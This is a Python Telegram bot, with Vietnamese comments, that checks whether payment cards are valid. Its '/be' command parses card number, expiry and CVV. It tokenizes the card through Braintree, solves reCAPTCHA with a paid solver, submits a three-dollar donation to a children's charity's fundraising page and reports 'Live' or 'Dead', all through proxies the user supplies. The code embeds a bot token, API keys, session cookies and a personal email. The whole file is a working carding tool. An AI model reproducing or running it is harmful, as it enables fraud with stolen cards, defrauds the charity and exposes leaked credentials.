import requests
import json
import re
import time
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

proxy_config = None  # Biến toàn cục lưu proxy

class BraintreeTool:
    def __init__(self):
        # URL API
        self.api_url = "https://payments.braintree-api.com/graphql"
        self.captcha_url = "https://autocaptcha.pro/apiv3/process"
        self.payment_url = "https://fundraising.childhood.org.au/payments/donate/embedded"
        self.status_url = "https://fundraising.childhood.org.au/payments/donate/retrieve-payment-status"

    def getcards(self, text: str):
        text = text.replace('\n', ' ').replace('\r', '')
        card = re.findall(r"[0-9]+\d", text)

        if len(card) == 0 or len(card) < 3:
            return None

        if len(card) == 3:
            cc = card[0]
            if len(card[1]) == 3:
                mes = card[2][:2]
                ano = card[2][2:]
                cvv = card[1]
            else:
                mes = card[1][:2]
                ano = card[1][2:]
                cvv = card[2]
        else:
            cc = card[0]
            if len(card[1]) == 3:
                mes = card[2]
                ano = card[3]
                cvv = card[1]
            else:
                mes = card[1]
                ano = card[2]
                cvv = card[3]
                if len(mes) == 2 and (mes > '12' or mes < '01'):
                    ano1 = mes
                    mes = ano
                    ano = ano1

        return cc, mes, ano, cvv

    def tokenize_credit_card(self, cc, mes, ano, cvv, proxies=None):
        payload = {
            "clientSdkMetadata": {
                "source": "client",
                "integration": "custom",
                "sessionId": "NA"
            },
            "query": """
                mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   
                    tokenizeCreditCard(input: $input) {     
                        token     
                        creditCard {       
                            bin       
                            brandCode       
                            last4       
                            cardholderName       
                            expirationMonth      
                            expirationYear      
                            binData {         
                                prepaid         
                                healthcare         
                                debit         
                                durbinRegulated         
                                commercial         
                                payroll         
                                issuingBank         
                                countryOfIssuance         
                                productId       
                            }     
                        }   
                    } 
                }
            """,
            "variables": {
                "input": {
                    "creditCard": {
                        "number": cc,
                        "expirationMonth": mes,
                        "expirationYear": ano,
                        "cvv": cvv
                    },
                    "options": {
                        "validate": False
                    }
                }
            },
            "operationName": "TokenizeCreditCard"
        }

        headers = {
            "Accept": "*/*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": "Bearer production_mb3d6dk2_yp2cn3cq7mt3jzpw",
            "Braintree-Version": "2018-05-10",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Host": "payments.braintree-api.com",
            "Origin": "https://assets.braintreegateway.com",
            "Referer": "https://assets.braintreegateway.com/",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "cross-site",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36"
        }

        response = requests.post(self.api_url, headers=headers, json=payload, proxies=proxies)
        if response.status_code == 200:
            data = response.json()
            return data['data']['tokenizeCreditCard']['token']
        else:
            return None

    def get_captcha(self):
        captcha_payload = {
            "key": "f85a2bb5c748b3f78eaea839d89b1f64",
            "type": "recaptchav2",
            "googlesitekey": "6LcavOAjAAAAAJ3ApKU6NcsLJJm26rP4DJiI0UTJ",
            "pageurl": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268"
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*",
            "Content-Type": "application/json"
        }

        response = requests.post(self.captcha_url, headers=headers, data=json.dumps(captcha_payload))

        if response.status_code == 200:
            data = response.json()
            if data.get('success'):
                return data.get('captcha')  
            else:
                return None
        else:
            return None

    def process_payment(self, token, captcha, proxies=None):
        payment_payload = {
            "DonationType": "D",
            "Message": None,
            "RegularGivingSettings": {
                "Enable": False,
                "Frequency": "M",
                "NextPayment": "2024-10-29 15:50:15 +00:00",
                "Amount": 3
            },
            "DonationItems": [{
                "AcceptCost": False,
                "IsAnonymous": False,
                "TaxTypeId": 1,
                "ProductType": 1,
                "Description": "Tax Deductible Donation",
                "UnitPrice": 3,
                "Quantity": 1,
                "BeneficiaryId": 1268,
                "EventCampaignId": 10310,
                "FundraisingPageId": None,
                "MainLineItem": True
            }],
            "TokenDetailsForTransaction": {
                "Token": token,
                "Type": "CC",
                "CredentialHolder": "Thanh Vu"
            },
            "CustomerDetails": {
                "DonorType": "I",
                "CompanyName": "",
                "FirstName": "Thanh",
                "LastName": "Vu",
                "EmailAddress": "jpbeluga3@gmail.com",
                "MobileNumber": "",
                "ContactNumber": "",
                "AddressLine1": "",
                "Suburb": "",
                "Postcode": "",
                "State": "",
                "Country": "",
                "ReceiveNewsletter": False,
                "ReceiveGFNewsletter": False
            },
            "TuringTest": captcha,
            "TuringTestResult": {},
            "WaitForCompletion": False,
            "MetaData": []
        }

        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Host": "fundraising.childhood.org.au",
            "Origin": "https://fundraising.childhood.org.au",
            "Referer": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268",
            "RequestVerificationToken": "ceH0CkTb8gWQ6JVU3uq0jdoJnJzPF9ReeGawyEBJ58iDyTHoTkMePKNdMT6ziA36kZ23ZBGsPyqm3npX_n0eYZe3nqs1:fWydDKhIC_5tk8_3p_JlMUsXvcOKhyubMZPC5k3RHRZPn76LAlmpVfPuER7laPcgVQb9e8FJb7-jcO4p5gkuiqje0Os1",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
            "Cookie": "ASP.NET_SessionId=origx1a40de34ibfv0bykmqh; _gcl_au=1.1.314313641.1722444236"
        }

        response = requests.post(self.payment_url, headers=headers, data=json.dumps(payment_payload), proxies=proxies)
        if response.status_code == 200:
            data = response.json()
            return data.get('data', {}).get('ReferenceId', None)
        else:
            return None

    def check_payment_status(self, ref_id, proxies=None):
        status_payload = {
            "clientReferenceId": ref_id
        }

        headers = {
            "Content-Type": "application/json;charset=UTF-8",
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip, deflate, br, zstd",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Host": "fundraising.childhood.org.au",
            "Origin": "https://fundraising.childhood.org.au",
            "Referer": "https://fundraising.childhood.org.au/payments/donate/beneficiary/1268",
            "RequestVerificationToken": "undefined",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"99\", \"Google Chrome\";v=\"127\", \"Chromium\";v=\"127\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
            "Cookie": "ASP.NET_SessionId=origx1a40de34ibfv0bykmqh"
        }

        response = requests.post(self.status_url, headers=headers, data=json.dumps(status_payload), proxies=proxies)
        if response.status_code == 200:
            data = response.json()
            return data['data'].get('PaymentStatus', "Failure"), data['data'].get('FailureMessage', "No specific message")
        else:
            return "Failure", None

    def process_cards(self, card_list, proxies=None):
        for card in card_list:
            card_info = self.getcards(card)
            if card_info is None:
                continue

            cc, mes, ano, cvv = card_info
            token = self.tokenize_credit_card(cc, mes, ano, cvv, proxies=proxies)
            if not token:
                continue

            captcha = self.get_captcha()
            if not captcha:
                print("Captcha giải lỗi.")
                continue
            
            ref_id = self.process_payment(token, captcha, proxies=proxies)
            if ref_id:
                time.sleep(7)
                status, failure_message = self.check_payment_status(ref_id, proxies=proxies)
                if status == "SUCCESS":
                    return "Live"
                else:
                    return f"Dead: {failure_message}"
            else:
                return "Dead"

# Bot Telegram handlers
async def handle_be(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message.text
    card_details = message.split(" ")[1]  # Lấy thẻ từ lệnh
    tool = BraintreeTool()
    result = tool.process_cards([card_details], proxies=proxy_config)
    await update.message.reply_text(result)

async def handle_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global proxy_config
    message = update.message.text
    proxy_details = message.split(" ")[1]
    ip, port, username, password = proxy_details.split(":")
    proxy_config = {
        "http": f"http://{username}:{password}@{ip}:{port}",
        "https": f"http://{username}:{password}@{ip}:{port}"
    }
    await update.message.reply_text("Proxy đã được thiết lập.")

# Khởi tạo bot Telegram
async def main():
    application = ApplicationBuilder().token("5452812723:AAHwdHJSMqqb__KzcSIOdJ3QuhqsIr9YTro").build()
    
    # Thêm các handlers cho các lệnh
    application.add_handler(CommandHandler("be", handle_be))
    application.add_handler(CommandHandler("proxy", handle_proxy))

    # Chạy bot
    await application.run_polling()

if __name__ == "__main__":
    import asyncio
    asyncio.run(main())
